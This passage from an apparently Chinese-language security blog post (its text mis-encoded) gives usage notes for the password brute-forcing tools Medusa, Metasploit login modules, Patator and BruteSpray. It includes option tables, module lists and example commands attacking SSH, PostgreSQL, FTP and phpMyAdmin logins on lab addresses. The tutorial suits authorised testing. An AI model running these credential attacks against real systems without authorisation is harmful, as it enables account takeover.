</tr>
<tr>
<td>-M</td>
<td>æ¨¡å—æ‰§è¡Œåç§°</td>
</tr>
<tr>
<td>-O</td>
<td>ä¿å­˜æˆåŠŸçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>-n</td>
<td>ä½¿ç”¨éé»˜è®¤ç«¯å£</td>
</tr>
<tr>
<td>-s</td>
<td>å¯ç”¨SSL</td>
</tr>
<tr>
<td>-t</td>
<td>è®¾å®šçº¿ç¨‹æ•°é‡</td>
</tr>
<tr>
<td>-r</td>
<td>è®¾ç½®é‡è¯•æ—¶é—´é—´éš” ç§’ã€‚</td>
</tr>
<tr>
<td>-L</td>
<td>å¹¶è¡ŒåŒ–ï¼Œæ¯ä¸ªç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹</td>
</tr>
<tr>
<td>-f</td>
<td>åœ¨ä»»ä½•ä¸»æœºä¸Šæ‰¾åˆ°ç¬¬ä¸€ä¸ªè´¦å·/å¯†ç åï¼Œåœæ­¢ç ´è§£</td>
</tr>
<tr>
<td>-z</td>
<td>ç»§ç»­æ‰«æä¸Šä¸€æ¬¡</td>
</tr>
<tr>
<td>-v</td>
<td>è¯¦ç»†çº§åˆ«ï¼ˆ0-6ï¼‰</td>
</tr>
</tbody></table>
<h4 id="ä½¿ç”¨æ–¹æ³•-1"><a href="#ä½¿ç”¨æ–¹æ³•-1" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h4><ul>
<li>æŒ‡å®šç›®æ ‡åœ°å€æ–‡ä»¶ï¼Œç”¨æˆ·åpostgresï¼Œ ç«¯å£5432ï¼Œ å¯†ç å­—å…¸ï¼Œåˆ¤æ–­å¯†ç æ˜¯å¦æ˜¯ç©ºå¯†ç æˆ–è€…è´¦å·å¯†ç ç›¸åŒï¼Œçˆ†ç ´postgresï¼Œçº¿ç¨‹255ï¼Œä¸€æ¬¡æˆåŠŸåˆ™åœæ­¢ï¼Œä¿å­˜ä¸ºgood.txtï¼Œé‡è¯•æ—¶é—´é—´éš”ä¸º0ç§’ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -H /tmp/ip.txt -u postgres -n 5432 -P /tmp/pass.txt -e ns -M postgres -T 255 -f -O /tmp/good.txt -r 0</span><br></pre></td></tr></table></figure>

<h3 id="Metaspolit"><a href="#Metaspolit" class="headerlink" title="Metaspolit"></a>Metaspolit</h3><p>ã€‚ã€‚ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search <span class="built_in">type</span>:auxiliary login</span><br><span class="line">(ssh_login,mysql_login,telnet_login,smb_login,ftp_login,tomcat_mgr_loginã€‚ã€‚ã€‚)</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login  </span><br><span class="line">(show options)</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.92.132</span><br><span class="line"><span class="built_in">set</span> username <span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> pass_file</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="Patator"><a href="#Patator" class="headerlink" title="Patator"></a>Patator</h3><p>Patatoræ˜¯å‡ºäºä½¿ç”¨Hydraï¼ŒMedusaï¼ŒNcrackï¼ŒMetasploitæ¨¡å—å’ŒNmap NSEè„šæœ¬è¿›è¡Œå¯†ç çŒœæµ‹æ”»å‡»è€Œæ„Ÿåˆ°æ²®ä¸§çš„ã€‚æˆ‘é€‰æ‹©äº†ä¸€ç§ä¸åŒçš„æ–¹æ³•ï¼Œä»¥ä¾¿ä¸åˆ›å»ºå¦ä¸€ä¸ªæš´åŠ›ç ´è§£å·¥å…·ï¼Œå¹¶é¿å…é‡å¤ç›¸åŒçš„ç¼ºç‚¹ã€‚Patatoræ˜¯ä¸€ä¸ªç”¨Pythonç¼–å†™çš„å¤šçº¿ç¨‹å·¥å…·ï¼Œå®ƒæ¯”åŒè¾ˆäººæ›´åŠ å¯é å’Œçµæ´»ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> git <span class="built_in">clone</span> https://github.com/lanjelot/patator.git</span><br><span class="line"> <span class="built_in">cd</span> patator</span><br><span class="line"> <span class="comment"># python3 setup.py install</span></span><br><span class="line">python3 patator.py</span><br><span class="line"> <span class="comment"># python3 patator.py ftp_login â€“helpæŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</span></span><br><span class="line">åŒ…å«çš„æ¨¡å—ï¼š</span><br><span class="line">+ ftp_login     : Brute-force FTP</span><br><span class="line"> + ssh_login     : Brute-force SSH</span><br><span class="line"> + telnet_login  : Brute-force Telnet</span><br><span class="line"> + smtp_login    : Brute-force SMTP</span><br><span class="line"> + smtp_vrfy     : Enumerate valid users using SMTP VRFY</span><br><span class="line"> + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO</span><br><span class="line"> + finger_lookup : Enumerate valid users using Finger</span><br><span class="line"> + http_fuzz     : Brute-force HTTP</span><br><span class="line"> + rdp_gateway   : Brute-force RDP Gateway</span><br><span class="line"> + ajp_fuzz      : Brute-force AJP</span><br><span class="line"> + pop_login     : Brute-force POP3</span><br><span class="line"> + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)</span><br><span class="line"> + imap_login    : Brute-force IMAP4</span><br><span class="line"> + ldap_login    : Brute-force LDAP</span><br><span class="line"> + smb_login     : Brute-force SMB</span><br><span class="line"> + smb_lookupsid : Brute-force SMB SID-lookup</span><br><span class="line"> + rlogin_login  : Brute-force rlogin</span><br><span class="line"> + vmauthd_login : Brute-force VMware Authentication Daemon</span><br><span class="line"> + mssql_login   : Brute-force MSSQL</span><br><span class="line"> + oracle_login  : Brute-force Oracle</span><br><span class="line"> + mysql_login   : Brute-force MySQL</span><br><span class="line"> + mysql_query   : Brute-force MySQL queries</span><br><span class="line"> + rdp_login     : Brute-force RDP (NLA)</span><br><span class="line"> + pgsql_login   : Brute-force PostgreSQL</span><br><span class="line"> + vnc_login     : Brute-force VNC</span><br><span class="line"> + dns_forward   : Forward DNS lookup</span><br><span class="line"> + dns_reverse   : Reverse DNS lookup</span><br><span class="line"> + snmp_login    : Brute-force SNMP v1/2/3</span><br><span class="line"> + ike_enum      : Enumerate IKE transforms</span><br><span class="line"> + unzip_pass    : Brute-force the password of encrypted ZIP files</span><br><span class="line"> + keystore_pass : Brute-force the password of Java keystore files</span><br><span class="line"> + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases</span><br><span class="line"> + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes</span><br><span class="line"> + tcp_fuzz      : Fuzz TCP services</span><br><span class="line"> + dummy_test    : Testing module</span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨æ–¹å¼-1"><a href="#ä½¿ç”¨æ–¹å¼-1" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp_login host=10.0.0.1 user=FILE0 0=logins.txt password=asdf -x ignore:mesg=<span class="string">&#x27;Login incorrect.&#x27;</span> -x ignore,reset,retry:code=500</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http_fuzz url=http://10.0.0.1/pma/index.php method=POST body=<span class="string">&#x27;pma_username=COMBO00&amp;pma_password=COMBO01&amp;server=1&amp;target=index.php&amp;lang=en&amp;token=&#x27;</span> 0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep=<span class="string">&#x27;Cannot log in to the MySQL server&#x27;</span> -l /tmp/qsdf</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh_login host=192.168.92.132 user=<span class="built_in">test</span> password=FILE0 0=/home/<span class="built_in">test</span>/æ¡Œé¢/TOP1000.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dns_forward name=FILE0.hsc.fr 0=names.txt -x ignore:code=3</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip_pass zipfile=challenge1.zip password=FILE0 0=rockyou.dic -x ignore:code!=0</span><br></pre></td></tr></table></figure>

<h3 id="BruteSpray"><a href="#BruteSpray" class="headerlink" title="BruteSpray"></a>BruteSpray</h3><p> BruteSprayæ˜¯ä¸€æ¬¾åŸºäºnmapæ‰«æè¾“å‡ºçš„gnmap/XMLæ–‡ä»¶ï¼Œè‡ªåŠ¨è°ƒç”¨Medusaå¯¹æœåŠ¡è¿›è¡Œçˆ†ç ´ï¼Œå£°ç§°é€Ÿåº¦æ¯”hydraå¿«ã€‚BruteSprayè°ƒç”¨medusaï¼Œå…¶è¯´æ˜ä¸­å£°ç§°æ”¯æŒsshã€ftpã€telnetã€vncã€mssqlã€mysqlã€postgresqlã€rshã€imapã€nntpã€pcanywhereã€pop3ã€rexecã€rloginã€smbntã€smtpã€svnå’Œvmauthdåè®®è´¦å·æš´åŠ›ç ´è§£ã€‚</p>
<p>  å®˜æ–¹é¡¹ç›®åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3g5MHNreXNuM2svYnJ1dGVzcHJheQ==">https://github.com/x90skysn3k/brutespray<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/x90skysn3k/brutespray.git</span><br></pre></td></tr></table></figure>

<ul>
<li>æ”¯æŒçš„æœåŠ¡</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh</span><br><span class="line">ftp</span><br><span class="line">telnet</span><br><span class="line">vnc</span><br><span class="line">mssql</span><br><span class="line">mysql</span><br><span class="line">postgresql</span><br><span class="line">rsh</span><br><span class="line">imap</span><br><span class="line">nntp</span><br><span class="line">pcanywhere</span><br><span class="line">pop3</span><br><span class="line">rexec</span><br><span class="line">rlogin</span><br><span class="line">smbnt</span><br><span class="line">smtp</span><br><span class="line">svn</span><br><span class="line">vmauthd</span><br><span class="line">snmp</span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨æ–¹å¼-2"><a href="#ä½¿ç”¨æ–¹å¼-2" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h4><ul>
<li>é¦–å…ˆéœ€è¦Nmapçš„æ‰«æç»“æœ<code>-oG nmap.gnmap</code> or <code>-oX nmap.xml</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -v 192.168.92.0/24 -oX nmap.xml</span><br></pre></td></tr></table></figure>

<ul>
<li>å‡ ç§æ‰«ææ¨¡å¼</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xml,json,gnmap</span></span><br><span class="line"><span class="comment"># äº¤äº’å¼</span></span><br><span class="line">brutespray --file nmap.xml â€“i</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šæœåŠ¡</span></span><br><span class="line">brutespray -f /home/jhc/nmap.xml -u <span class="built_in">test</span> --service ssh</span><br><span class="line">python brutespray.py --file nmap.gnmap --service ftp,ssh,telnet --threads 5 --hosts 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šç”¨æˆ·åå¯†ç </span></span><br><span class="line">python brutespray.py --file nmap.gnmap -u admin -p password --threads 5 --hosts 5</span><br><span class="line">python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´æˆåŠŸåç»§ç»­</span></span><br><span class="line">python brutespray.py --file nmap.gnmap --threads 5 --hosts 5 -c</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>å¯†ç ç”Ÿæˆ</tag>
      </tags>
  </entry>
</search>
